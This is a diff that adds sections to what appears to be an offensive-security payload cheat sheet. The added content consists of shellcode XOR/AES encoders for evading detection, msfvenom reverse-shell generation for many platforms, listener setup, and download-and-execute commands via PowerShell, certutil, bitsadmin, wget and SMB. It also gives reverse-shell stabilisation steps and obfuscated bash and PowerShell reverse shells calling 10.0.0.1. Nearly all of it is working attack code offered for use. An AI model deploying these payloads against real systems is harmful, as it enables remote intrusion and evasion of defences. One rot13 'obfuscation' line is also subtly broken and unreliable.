@@ -841,3 +841,326 @@ file test.exe
 md5sum test.exe
 msfvenom --payload windows/x64/shell_reverse_tcp --list-options
 ```
+
+---
+
+## 13. Payload Encoding Techniques
+
+### XOR Shellcode Encoding
+
+```python
+#!/usr/bin/env python3
+"""XOR-encode shellcode to evade static detection with custom key."""
+import sys
+
+def xor_encode(data, key):
+    """XOR each byte of data with the key (cycling through key bytes)."""
+    key_bytes = key if isinstance(key, bytes) else key.encode()
+    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])
+
+def xor_encode_single(data, key_byte):
+    """XOR each byte with a single key byte."""
+    return bytes([b ^ key_byte for b in data])
+
+# Read raw shellcode from msfvenom output
+if len(sys.argv) < 2:
+    print("Usage: python3 xor_encoder.py <shellcode_hex> [key]")
+    sys.exit(1)
+
+shellcode = bytes.fromhex(sys.argv[1])
+key = sys.argv[2] if len(sys.argv) > 2 else "SecretKey"
+
+encoded = xor_encode(shellcode, key)
+print(f"Original:  {shellcode.hex()}")
+print(f"Key:       {key}")
+print(f"Encoded:   {encoded.hex()}")
+print(f"Size:      {len(shellcode)} -> {len(encoded)} bytes")
+```
+
+### Base64 Payload Wrapping
+
+```bash
+# Wrap PowerShell payload in base64 for -enc delivery
+CMD='IEX(New-Object Net.WebClient).DownloadString("http://10.0.0.1:8080/shell.ps1")'
+ENCODED=$(echo -n "$CMD" | iconv -t utf-16le | base64 -w0)
+echo "powershell -nop -enc $ENCODED"
+
+# Generate base64-encoded Python payload
+msfvenom -p python/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o raw_shell.py
+base64 -w0 raw_shell.py > b64_shell.txt
+echo "python3 -c \"exec(__import__('base64').b64decode(open('b64_shell.txt').read()))\""
+```
+
+### AES Encryption for Payload Storage
+
+```python
+#!/usr/bin/env python3
+"""AES-encrypt shellcode for secure storage and transport."""
+import sys
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+import os
+import base64
+
+def aes_encrypt(data, key):
+    """Encrypt data with AES-256-CBC."""
+    iv = os.urandom(16)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    padded = pad(data, AES.block_size)
+    encrypted = cipher.encrypt(padded)
+    return iv + encrypted  # Prepend IV for decryption
+
+key = os.urandom(32)  # AES-256 key
+shellcode = bytes.fromhex(sys.argv[1]) if len(sys.argv) > 1 else b"\xcc\x90"
+
+encrypted = aes_encrypt(shellcode, key)
+print(f"Key (base64): {base64.b64encode(key).decode()}")
+print(f"Encrypted (base64): {base64.b64encode(encrypted).decode()}")
+```
+
+---
+
+## 14. Staged vs Stageless Payload Reference
+
+### Comparison Table
+
+```
+STAGED (e.g., windows/x64/meterpreter/reverse_tcp):
+  - Size: ~15KB (small stager, downloads second stage at runtime)
+  - Listener: MUST use multi/handler (serves second stage)
+  - Network: Requires TWO connections (initial + second stage download)
+  - Stealth: Better (smaller signature surface on disk)
+  - Reliability: Lower (depends on second stage download succeeding)
+  - Use when: Egress allows free outbound, need meterpreter features
+
+STAGELESS (e.g., windows/x64/meterpreter_reverse_tcp):
+  - Size: ~200KB+ (fully self-contained payload)
+  - Listener: Any TCP listener (nc, socat, multi/handler)
+  - Network: Requires ONE connection (callback only)
+  - Stealth: Worse (full payload visible on disk, larger signature surface)
+  - Reliability: Higher (no second stage dependency)
+  - Use when: Strict egress filtering, need reliability, simple listener
+```
+
+### Generation Examples
+
+```bash
+# Staged payloads (forward slash in transport name)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o staged.exe
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o staged.elf
+msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o staged.py
+
+# Stageless payloads (underscore in transport name)
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o stageless.exe
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o stageless.elf
+msfvenom -p python/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o stageless.py
+
+# Size comparison
+ls -la staged.exe stageless.exe
+# staged.exe: ~73KB    stageless.exe: ~200KB+
+```
+
+### Listener Configuration for Each Type
+
+```bash
+# For staged payloads: multi/handler is required
+msfconsole -q -x "use exploit/multi/handler; \
+  set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
+  set LHOST 10.0.0.1; set LPORT 4444; \
+  set ExitOnSession false; exploit -j"
+
+# For stageless payloads: any TCP listener works
+nc -lvnp 4444                    # Basic netcat
+rlwrap nc -lvnp 4444            # With readline support
+socat TCP-LISTEN:4444,fork FILE:`tty`,raw,echo=0  # With PTY
+
+# For stageless meterpreter: multi/handler also works
+msfconsole -q -x "use exploit/multi/handler; \
+  set PAYLOAD windows/x64/meterpreter_reverse_tcp; \
+  set LHOST 10.0.0.1; set LPORT 4444; exploit"
+```
+
+---
+
+## 15. Payload Delivery Methods
+
+### Web Delivery (HTTP)
+
+```bash
+# Python HTTP server for payload hosting
+python3 -m http.server 8080 --directory /tmp/payloads/
+
+# Target download commands:
+# Linux:
+wget http://10.0.0.1:8080/shell.elf -O /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf
+
+# Windows PowerShell:
+powershell -nop -c "IEX(New-Object Net.WebClient).DownloadFile('http://10.0.0.1:8080/shell.exe','$env:TEMP\s.exe');Start-Process $env:TEMP\s.exe"
+
+# Windows certutil:
+certutil -urlcache -split -f http://10.0.0.1:8080/shell.exe %TEMP%\s.exe && %TEMP%\s.exe
+
+# Windows bitsadmin:
+bitsadmin /transfer d http://10.0.0.1:8080/shell.exe %TEMP%\s.exe && %TEMP%\s.exe
+```
+
+### SMB Delivery
+
+```bash
+# Start SMB server with Impacket for payload delivery
+impacket-smbserver share /tmp/payloads/ -smb2support
+
+# Target downloads payload from SMB share:
+# Windows: copy \\10.0.0.1\share\shell.exe %TEMP%\shell.exe && %TEMP%\shell.exe
+# Or execute directly: \\10.0.0.1\share\shell.exe
+```
+
+### FTP Delivery
+
+```bash
+# Start FTP server for payload delivery
+pip3 install pyftpdlib
+python3 -m pyftpdlib -p 21 --write
+
+# Target downloads via FTP:
+# Windows: ftp -s:ftp_commands.txt
+# ftp_commands.txt:
+# open 10.0.0.1
+# anonymous
+# anonymous
+# binary
+# get shell.exe %TEMP%\shell.exe
+# bye
+```
+
+---
+
+## 16. Cross-Platform Payload Reference
+
+### Architecture-Specific Payloads
+
+```bash
+# Windows x86 (32-bit)
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a x86 -f exe -o win32.exe
+
+# Windows x64 (64-bit)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a x64 -f exe -o win64.exe
+
+# Linux x86
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a x86 -f elf -o lin32.elf
+
+# Linux x64
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a x64 -f elf -o lin64.elf
+
+# Linux ARM (Raspberry Pi, IoT devices)
+msfvenom -p linux/armle/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a armle -f elf -o arm.elf
+
+# Linux MIPS (routers, embedded devices)
+msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a mipsle -f elf -o mips.elf
+
+# macOS x64
+msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a x64 -f macho -o mac64.macho
+
+# Android APK
+msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -o android.apk
+
+# Java JAR (cross-platform)
+msfvenom -p java/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f jar -o crossplatform.jar
+
+# PHP (web application deployment)
+msfvenom -p php/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php
+
+# Python (cross-platform with interpreter)
+msfvenom -p python/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.py
+
+# Node.js
+msfvenom -p nodejs/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.js
+
+# ASPX (IIS web server)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f aspx -o shell.aspx
+
+# JSP (Tomcat/JBoss)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.jsp
+
+# WAR (Tomcat deploy)
+msfvenom -p java/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war
+```
+
+---
+
+## 17. Reverse Shell Upgrade Techniques
+
+### Full Stabilization Sequence
+
+```bash
+# After catching a raw reverse shell:
+
+# Step 1: Spawn PTY with Python
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Step 2: Background the shell (Ctrl+Z)
+
+# Step 3: Configure terminal for raw mode
+stty raw -echo; fg
+
+# Step 4: Set terminal type
+export TERM=xterm
+stty rows 38 cols 136
+
+# Alternative: One-line stabilization
+# (run inside the raw shell)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Then: Ctrl+Z -> stty raw -echo; fg -> Enter x2 -> export TERM=xterm
+```
+
+### Socat Full PTY Shell
+
+```bash
+# Attacker listener (provides full PTY):
+socat TCP-LISTEN:4444,reuseaddr,fork FILE:`tty`,raw,echo=0
+
+# Target connect-back (requests PTY):
+socat TCP:10.0.0.1:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
+
+# Transfer socat to target if not present:
+# On attacker: python3 -m http.server 8080
+# On target: curl http://10.0.0.1:8080/socat -o /tmp/socat && chmod +x /tmp/socat
+```
+
+---
+
+## 18. Payload Obfuscation Techniques
+
+### PowerShell Obfuscation
+
+```powershell
+# Method 1: String concatenation
+cmd /c "pow"&"er"&"sh"&"ell -nop -c ""IEX(Ne"&"w-Ob"&"ject Ne"&"t.WebC"&"lient).Down"&"loadStr"&"ing('http://10.0.0.1/s.ps1')"""
+
+# Method 2: Environment variable manipulation
+cmd /c "set p=powershell && %p% -nop -enc <BASE64>"
+
+# Method 3: WMI execution (bypasses some command-line logging)
+wmic process call create "powershell -nop -enc <BASE64>"
+
+# Method 4: Using bash-style variable substitution (not available in cmd)
+# Use PowerShell IEX with variable splitting instead:
+powershell -nop -c "$s='Down';$l='loadString';IEX (New-Object Net.WebClient).$($s+$l)('http://10.0.0.1/s.ps1')"
+```
+
+### Bash Payload Obfuscation
+
+```bash
+# Variable substitution to break pattern matching
+a="bash";b="-i";c=">&";d="/dev/tcp/10.0.0.1/4444";e="0>&1"
+$a $b $c $d $e
+
+# Base64 decode and execute
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=" | base64 -d | bash
+
+# Hex encoding
+echo -e "\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x31\x30\x2e\x30\x2e\x30\x2e\x31\x2f\x34\x34\x34\x34\x20\x30\x3e\x26\x31" | bash
+
+# Using eval with encoded command
+eval $(echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" | rot13)
+```
